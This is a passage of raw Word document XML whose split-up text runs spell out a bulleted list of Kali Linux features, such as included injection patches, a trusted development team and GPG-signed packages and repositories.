        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>est</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="41"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>j</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>pa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ches </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>uded.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="298" w:lineRule="auto"/>
        <w:ind w:left="808" w:right="75" w:hanging="284"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="14"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Deve</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>oped</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>a sec</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>env</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>onment:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Ka</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>Li</w:t>
      </w:r>
      <w:r>
        <w:t>nux</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ade</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>up</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>of a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">group of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nd</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>dua</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>who are</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ones</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>rus</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>mm</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>packages</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>era</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he repos</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>es, a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>of wh</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ch </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s done</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>lti</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e secure</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>pro</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>oco</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>s.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="524"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>G</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>P</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>G</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>gned</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>packages</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>epos</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>tor</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>es:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>very</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>pac</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:t>age</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Ka</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>Li</w:t>
      </w:r>
      <w:r>
        <w:t>nux</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>gned</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>by</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>each</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="78" w:line="288" w:lineRule="auto"/>
        <w:ind w:left="808" w:right="74"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nd</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>dual</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>dev</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>oper</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>who</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>bu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>mi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>repos</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>or</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>es</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>subsequen</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>tl</w:t>
      </w:r>
      <w:r>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>gn</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he pac</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:t>ages as we</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ll</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="307" w:lineRule="auto"/>
        <w:ind w:left="808" w:right="74" w:hanging="284"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Mu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>anguage</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="35"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>port:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="36"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>It</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="35"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>has</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="36"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>lt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
